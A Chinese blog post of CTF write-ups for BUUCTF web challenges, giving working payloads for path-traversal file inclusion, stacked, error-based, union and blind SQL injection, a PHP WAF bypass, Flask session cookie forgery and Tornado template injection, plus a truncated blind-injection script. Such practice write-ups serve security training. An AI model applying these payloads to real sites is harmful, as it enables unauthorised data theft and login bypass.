<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer"/>
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">BUUCTF | 秋雨样的个人博客</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="//img.imgdb.cn">
  <link rel="dns-prefetch" href="//jsd.onmicrosoft.cn">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "想玩电脑のQYY";
  mashiro_option.author_name = "QYY";
  mashiro_option.site_url = "https://qiuyuyang.top";
  mashiro_option.v_appId = "WhLPjDYKzsAx2BzsScNjTPs1-gzGzoHsz";
  mashiro_option.v_appKey = "WXSeTt9SPmKWgPlGQ0XwNXxt";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "https://img.imgdb.cn/item/601d51193ffa7d37b30656ce.png,https://img.imgdb.cn/item/601d510c3ffa7d37b306506d.png".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}.centerbg{ background-position: center center;background-attachment: inherit;}
  </style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="秋雨样的个人博客" type="application/atom+xml">
</head>

<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://qiuyuyang.top">
          <img src="https://article.biliimg.com/bfs/article/b4144522e96608adb59936edcda4bb4a290349942.png">
        </a>
      </div>
      <div class="header-info">
        <p>没有你的未来不是我想要的未来</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://jsd.onmicrosoft.cn/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="http://github.com/qiuyuyang910" target="_blank" class="social-github" title="github">
                    <img src="https://article.biliimg.com/bfs/article/d2a582e953d81be6f58b1fabba31626c290349942.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://qm.qq.com/cgi-bin/qm/qr?k=9nJRtJfmxyIIc5kYw-DbP2gxXMq9gllE" target="_blank" class="social-github" title="QQ">
                    <img src="https://article.biliimg.com/bfs/article/4dc7054085653fcb3f2d6d9a5a75c2fd290349942.png">
                  </a>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="https://article.biliimg.com/bfs/article/e8ee78ef6e85222e8afae18be4af0a8d290349942.png">
                  </a>
                  <div class="wechatInner">
                    <img src="https://article.biliimg.com/bfs/article/6e05f1778cb543f93735df847e2b3609290349942.jpg">
                  </div>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://jsd.onmicrosoft.cn/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">想玩电脑の</span>
            <span class="shironeko">QYY</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/%E6%8A%80%E6%9C%AF/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/%E7%94%9F%E6%B4%BB/">
                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
                          生活
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/%E8%B5%84%E6%BA%90/">
                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
                          资源
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/%E9%9A%8F%E6%83%B3/">
                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
                          随想
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/%E8%BD%AC%E8%BD%BD/">
                          <i class="fa fa-book" aria-hidden="true"></i>
                          转载
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    清单
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/tags/%E6%82%A6%E8%AF%BB/">
                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                          书单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/bangumi/">
                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                          番组
                        </a>
                      </li>
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-headphones" aria-hidden="true"></i>
                          歌单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/tags/%E5%9B%BE%E9%9B%86/">
                          <i class="fa fa-photo" aria-hidden="true"></i>
                          图集
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/donate/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
                    赞赏
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我？
                        </a>
                      </li>
                    
                      <li>
                        <a href="/lab/">
                          <i class="fa fa-cogs" aria-hidden="true"></i>
                          Lab
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/atom.xml">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
                    RSS
                  </span>
                </a>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

  <div class="pattern-center single-center">
    <!-- 有配图默认渲染第一张 -->
    <div class="pattern-attachment-img lazyload" style="background-image: url(https://img.buuoj.cn/2022/img/3.png);" src="https://jsd.onmicrosoft.cn/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://img.buuoj.cn/2022/img/3.png">
    </div>
    <header class="pattern-header single-header">
      <h1 class="entry-title">
      BUUCTF</h1>
      <p class="entry-census">
        <span>
          <a href="https://qiuyuyang.top/">
            <img src="https://article.biliimg.com/bfs/article/b4144522e96608adb59936edcda4bb4a290349942.png">
          </a>
        </span>
        <span>
          <a href="https://qiuyuyang.top/">秋雨样</a>
        </span>
        <span class="bull">
        ·</span>
        2024-4-1<span class="bull">
        ·</span>
      <span id="busuanzi_value_page_pv"></span>次阅读</p>
    </header>
  </div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
        <div class="entry-content">
          <h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>index源码注释叫我们直接访问source.php</p>
<p>直接访问可得到源码</p>
<p>看不懂抄一手</p>
<pre><code class="php">
 &lt;?php
    highlight_file(__FILE__);
    class emmm
    &#123;
        public static function checkFile(&amp;$page) 
        //传入了变量page，也就是我们刚刚传进来的file
            
        &#123;
            // 这里定义了白名单,包括source.php和hint.php
            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
            
            if (! isset($page) || !is_string($page)) &#123;
            /*为了返回 true 两个条件必须满足
                1 page存在 
                2 page是字符串 ，
                这里和外层的判断file 一致基本是再次判断了一遍*/
                echo &quot;you can&#39;t see it&quot;;
                return false;
            &#125;
            
            if (in_array($page, $whitelist)) &#123;
                return true;
            &#125;
            /*in_array(search,array,type) 函数搜索数组中是否存在指定的值，
            白名单过滤，需要返回了ture
            所以这里我们传入的page或者是经过截断之后的page必须是soure.php或hint.php，
            这里是正常的访问，我们需要构造文件任意包含，所以这里传入的不满足条件，这里不是注意的点，往下继续看*/
            
            $_page = mb_substr( 
                $page,
                0,
                mb_strpos($page . &#39;?&#39;,  &#39;?&#39;)
            );
            /*这里mb_substr 是个截断，返回0到mb_strpos之间的内容，而mb_strpos 则是查找第一次出现的位置，所以基本可以理解为获取page 两个？之间的字符串，也就是获取file两个？之间的字符串，放到url中就是http://ip/?file=ddd?中的file=ddd*/    
            
            if (in_array($_page, $whitelist)) &#123; 
                return true;
            &#125;
            //这里和上面类似 查看_page 是否在白名单中
            
            $_page = urldecode($page);  // 这里发现对_page进行了一次decode解码，
            $_page = mb_substr(			//获取两个？？之间的内容
                $_page,
                0,
                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
            );
            //先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为&#39;?&#39;，仍可通过第四个if语句校验。（&#39;?&#39;两次编码值为&#39;%253f&#39;），构造url：
            // 这里是我们要绕过的点，从这里往上看 尝试构造
            
            if (in_array($_page, $whitelist)) &#123;//白名单
                return true;
            &#125;
            echo &quot;you can&#39;t see it&quot;;
            return false;
        &#125;
    &#125;

    if (! empty($_REQUEST[&#39;file&#39;])
        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
    ) &#123;
        include $_REQUEST[&#39;file&#39;];
        exit;
    &#125; else &#123;
        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
    &#125;
    /*必须满足if条件，才能包含file，这里也可以猜到可能考的是文件包含： 
        1 REQUEST[&#39;file&#39;]不为空 
        2 REQUEST[&#39;file&#39;]是字符串
        3 checkFile($_REQUEST[&#39;file&#39;]) 为ture，回到checkFile 函数分析如何返回true*/    
?&gt;
</code></pre>
<p>考察代码审计，只要能通过checkFile函数就行，这里会获得俩??之间的字符串来判断，所以playload里面得有<code>?hint.php?</code>再然后不知道<code>ffffllllaaaagggg</code>在那个目录，就得路径穿越了，构造<code>../</code></p>
<p>payload:</p>
<pre><code class="txt">http://249c777a-c885-4ab3-bef4-4efb5270da80.node5.buuoj.cn:81/index.php?file=hint.php?../../../../../ffffllllaaaagggg
</code></pre>
<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>sql注入题</p>
<p>后端</p>
<pre><code class="sql">select $_POST[&#39;query&#39;] || flag from Flag;
</code></pre>
<p>payload</p>
<pre><code class="sql">
1;select *,1
</code></pre>
<p>结果就成了</p>
<pre><code class="sql">
select 1;select *,1 || flag from Flag;

</code></pre>
<p>导致堆叠注入输出flag</p>
<p>或者设置<code>SQL_MOD</code></p>
<blockquote>
<p>SQL_MOD：是MySQL支持的基本语法、校验规则<br>其中PIPES_AS_CONCAT:会将||认为字符串的连接符，而不是或运算符，这时||符号就像concat函数一样。</p>
</blockquote>
<pre><code class="sql">
mysql&gt; set sql_mode=PIPES_AS_CONCAT;
Query OK, 0 rows affected (0.00 sec)

mysql&gt;
mysql&gt; select 1 || &#39;flag&#39;;
+-------------+
| 1 || &#39;flag&#39; |
+-------------+
| 1flag       |
+-------------+
1 row in set (0.00 sec)

mysql&gt; select &#39;a&#39; || &#39;flag&#39;;
+---------------+
| &#39;a&#39; || &#39;flag&#39; |
+---------------+
| aflag         |
+---------------+
1 row in set (0.00 sec)
</code></pre>
<p>payload</p>
<pre><code class="sql">1;set sql_mod=PIPES_AS_CONCAT;select 1
插入SQL语句就成为
select concat(1,flag) from Flag;
</code></pre>
<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>考察堆叠注入</p>
<pre><code class="sql">
&#39;;show tables--+

</code></pre>
<p>得到表名</p>
<pre><code class="sql">
&#39;;show columns from `1919810931114514`--+
</code></pre>
<p>得到flag字段</p>
<p>最后</p>
<pre><code class="sql">
1&#39;; handler `1919810931114514` open as `a`; handler `a` read next;#
</code></pre>
<p>handler</p>
<pre><code class="txt">
 mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
</code></pre>
<pre><code class="sql">1 &#39;;handler (数据表)  open ;handler （数据表） read first;handler （数据表） close; % 23
</code></pre>
<p>rename:</p>
<p>修改一个或多个表的名称</p>
<pre><code class="sql">RENAME TABLE old_table_name TO new_table_name;
</code></pre>
<p>alert:</p>
<p>向表中添加字段</p>
<pre><code class="sql">Alter table [表名] add [列名] 类型
</code></pre>
<p>保留old和new列名</p>
<pre><code>列名：a ----&gt;b 列类型
　　　ALTER TABLE t1 CHANGE a b INTEGER;
</code></pre>
<p>由于这道题没有禁用rename和alert，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表（1919810931114514）改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p>
<pre><code class="sql">1 %27;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
</code></pre>
<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><pre><code class="php">
&lt;?php
error_reporting(0);
if(!isset($_GET[&#39;num&#39;]))&#123;
   show_source(__FILE__);
&#125;else&#123;
       $str = $_GET[&#39;num&#39;];
       $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
       foreach ($blacklist as $blackitem) &#123;
               if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;
                       die(&quot;what are you want to do?&quot;);
               &#125;
       &#125;
       eval(&#39;echo &#39;.$str.&#39;;&#39;);
&#125;
?&gt;
</code></pre>
<p>f12查看源码发现<code>calc.php</code><br>传参发现存在waf拦截</p>
<p>利用php特性绕过：</p>
<p><a href="https://www.cnblogs.com/sfsec/p/15205011.html">参考</a></p>
<p>PHP的字符串解析特性</p>
<p>我们知道PHP将查询字符串（在URL或正文中）转换为内部<code>$_GET</code>或的关联数组<code>$_POST</code>。例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为Array([news_id] &#x3D;&gt; 42)。如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
<p><code>/news.php?%20news[id%00=42&quot;+AND+1=0–</code></p>
<p>上述PHP语句的参数<code>%20news[id%00</code>的值将存储到<code>$_GET[“news_id”]</code>中。</p>
<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<blockquote>
<p>1.删除空白符<br>2.将某些字符转换为下划线（包括空格）</p>
</blockquote>
<p>总的来说就是传参前面的空格会被删除，<code>]</code>符号会被替换成<code>_</code>所以传参的时候遇到下划线得用<code>]</code>替代</p>
<p>所以绕过的payload就为<br><code>? num=a</code></p>
<p>列出根目录文件</p>
<h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><p>列出目录中的文件和目录</p>
<p>eg: <code>scandir(&#39;/&#39;)</code></p>
<pre><code class="txt">
Array
(
[0] =&gt; .
[1] =&gt; ..
[2] =&gt; cat.gif
[3] =&gt; dog.gif
[4] =&gt; horse.gif
[5] =&gt; myimages
)
Array
(
[0] =&gt; myimages
[1] =&gt; horse.gif
[2] =&gt; dog.gif
[3] =&gt; cat.gif
[4] =&gt; ..
[5] =&gt; .
)
</code></pre>
<p>读取文件</p>
<pre><code class="url">var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`
</code></pre>
<h2 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h2><p>标准打印数组</p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>读取文件</p>
<h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>flask session伪造</p>
<p>可以从网页里翻出源码的，但是源码被删了</p>
<p>有了源码就可以在<code>config.py</code>里面找到<code>secret_key</code>找到后就可以加解密了</p>
<pre><code class="bash">PS E:\Desktop\ctf\flask-session-cookie-manager-master&gt; python39.exe .\flask_session_cookie_manager3.py decode -c .eJxFkMGKwkAMhl9lydlDO9WL4EEZt7SQKS5TS-Yiaqttp3GhKrYjvvsOLuwecvqS7-fPE3anvrrWML_192oCu6aE-RM-DjAHLBJhOAmQMTQxCnSGydFI-jylFgcS-ejZ4CfKJIWoKSB3jJTnKDFQWtlMf9ZKrx-oy4ZcPmbSjqbwjNPO8Jclt-ow3raZrjvUqxrllpXOIyOtUO0yNJIeRi4HciUrl8wwTgS5tch0EimZtqRX7HcX8JrA8dqfdrdvW13-Kwh_HiczYuX1-QyLzZDF20ZJFEr4mCJlZNMYnXZZsX6YtrS4XLx1De_P1Z8pt9PpYfNLLnv2APYlN5cQJnC_Vv37cRAG8PoBOrNsUg.Zh1BCg._LSyxZCqUDbr3zU2RkUofmHE5PM
b&#39;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;MWI2ZmI0MmM1ZGM2MzZmYzYyYTg4YjMxY2UyMmMxMmM3ODY1MTY0Yzc3NTg4MDM0NTNkOTFhNTEwMTdiYzUyODkyZWM0NmJlZmRkYzBlMGVjOThlMTBhMDVmNTU3ZDk2NjA1ZDYwZDAxYzdmNzI5MGI2YzE2OTI3NDJjYTBmZDk=&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;M2YwZGI5YmNlMTU5MWQxOGViNDM2N2U3ZWJmMmZiZTJlOWEwZjdkMA==&quot;&#125;,&quot;image&quot;:&#123;&quot; b&quot;:&quot;Uk44bQ==&quot;&#125;,&quot;name&quot;:&quot;admin1&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#39;
</code></pre>
<p>更改admin1为admin后就行<br>但是有一个很坑的点就是这里用的双引号，但是加密的时候得用单引号，所以要把双引号改成单引号后加密</p>
<pre><code class="bash">
E:\Desktop\ctf\flask-session-cookie-manager-master&gt;python39.exe flask_session_cookie_manager3.py encode -s ckj123 -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;a964ffdf9ad843337371b754fe4dee5f513139037266dcff517e58e1
e59fd05671c5370244ce3d91eb5b1c44857c213c8de30f4c6d3d604d0724863c8a99a6aa&#39;, &#39;csrf_token&#39;: b&#39;d1bffe11dbd467f7d2a1b79345789c2599b72276&#39;, &#39;image&#39;: b&#39;1JK4&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;
.eJw9kE9vgkAQR79KM2cO_NELiQeaBWLSGaJZJLsXQhEtuyxtUFNZ43fvahMPc3rJy-_NDerD1J2-ID5Pl86Dut9DfIO3T4hBcB1SLo3MxVJUmwUxtGhbSzbryZa-NO7y3UCVCJDjFa3-dXwmJbUIpSGeRpKXC8mzgfhgJEsCUu1V2NI5kpnYVklOunBcqF2PFfrEjgGFOCMnVeTbAe27oRxDyUiTSnzniFC5LerB02VRpaGo0hXcPWhP06E-f-tufCVIlvUuYECeaWE2Pqm9oXAzC_5I0JZYGRVsUKhKp1o79Tqi4-qp601z7F4mLH8-KPknY2McgGZv-hE8uJy66fk3CHy4_wFvSmyb.Zh1Ggw.UpY4s73R-GH8qEUu6u1i8Ynd_X4
</code></pre>
<p>最不理解的一集</p>
<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>三个文件</p>
<pre><code class="txt">
/flag.txt
flag in /fllllllllllllag
 
 
/welcome.txt
render
 
 
/hints.txt
md5(cookie_secret+md5(filename))
</code></pre>
<p>通过<code>rander</code>可以发现使用的是<code>flask</code>当随意输值后可以发现报错，而且msg存在模板注入，但是这里要获得 <code>cookie_secret</code><br>而我们查官方文档，tornado在搭建一个网站时，肯定会有多个handler，而这些handler都是RequestHandler的子类</p>
<p>RequestHandler.settings又指向self.application.settings</p>
<p>所以我们可以说handler.settings指向了RequestHandler.settings了，对吧</p>
<p>这样我们就可以构造一下payload：<code>?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
<p>于是获得cookie_secret:</p>
<pre><code class="txt">
&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;66d79cfd-d1a2-4d07-a00a-a49d062befe7&#39;&#125;
</code></pre>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>报错注入</p>
<p>extractvalue</p>
<pre><code class="sql">
&#39;admin &#39;^extractvalue(1,concat(0x5c,(select(database()))))%23

extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x5c))%23

extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(((table_schema)like(database()))and((table_name)like(&#39;H4rDsq1&#39;)))),0x5c))%23

^extractvalue(1,concat(0x5c,(select(group_concat(password))from(H4rDsq1)),0x5c))%23

被截断

extractvalue(1,concat(0x5c,right((select(group_concat(password))from(H4rDsq1)),32),0x5c))%23

extractvalue(1,concat(0x5c,right((select(group_concat(password))from(H4rDsq1)),20),0x5c))%23
</code></pre>
<h1 id="GXYCTF-2019-BabySQli"><a href="#GXYCTF-2019-BabySQli" class="headerlink" title="[GXYCTF 2019]BabySQli"></a>[GXYCTF 2019]BabySQli</h1><p><a href="https://www.cnblogs.com/junlebao/p/13859371.html">参考</a></p>
<p>先是测试，发现有waf，查看源码发现sql语句</p>
<pre><code class="sql">
select * from user where username = &#39;$name&#39;
</code></pre>
<p>使用union联合注入，发现一共有三个位置</p>
<p><img src="https://i0.hdslb.com/bfs/article/c8c699a1592252d8ce68be4449814b35290349942.png"></p>
<p>当密码传入的是数组时发现报错，可以确定密码进行了md5加密，当把admin放在第二个位置时，发现提示密码错误，即可猜到三个位置分别为id,username,password<br>又知道当密码传入是数组时返回NULL，那么我们也可构造密码为NULL从而绕过登录</p>
<p>payload</p>
<pre><code>name=a&#39; union select 1,&#39;admin&#39;,NULL #&amp;pw[]=1
</code></pre>
<p><img src="https://i0.hdslb.com/bfs/article/20dd4dd4b96734f8d0ce7bee69f921f6290349942.png"></p>
<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><p>先bp爆破哪些关键字被过滤了</p>
<pre><code>
`
~
!
@
#
$
%
^
&amp;
*
(
)
-
_
=
+
[
]
&#123;
&#125;
|
\
;
:
&#39;
&quot;
,
.
&lt;
&gt;
/
?
 
--
--+
/**/
&amp;&amp;
||
&lt;&gt;
!(&lt;&gt;)
and
or
xor
if
not
select
sleep
union
from
where
order
by
concat
group
benchmark
length
in
is
as
like
rlike
limit
offset
distinct
perpare
declare
database
schema
information
table
column
mid
left
right
substr
handler
ascii
set
char
hex
updatexml
extractvalue
regexp
floor
having
between
into
join
file
outfile
load_file
create
drop
convert
cast
show
user
pg_sleep
reverse
execute
open
read
first
case
end
then
iconv
greatest
</code></pre>
<p>再结合布尔盲注知识写payload</p>
<pre><code class="sql">id=0^(ascii(substr((select(flag)from(flag)),2,1))&gt;0)
</code></pre>
<p>脚本</p>
<pre><code class="python">import requests

url = &quot;http://80ff8565-6961-45a6-9b90-dbb64f939008.node5.buuoj.cn:81/index.php&quot;
for j in range(1,100):
    for i in range(128,32,-1):
        data=&#123;&quot;id&quot;:&quot;0^(ascii(substr((select(flag)from(flag)),&quot;+str(j)+&quot;,1))&gt;&quot;+str(i)+&quot;)&quot;&#125;
        
        quest=requests.post(url,data)
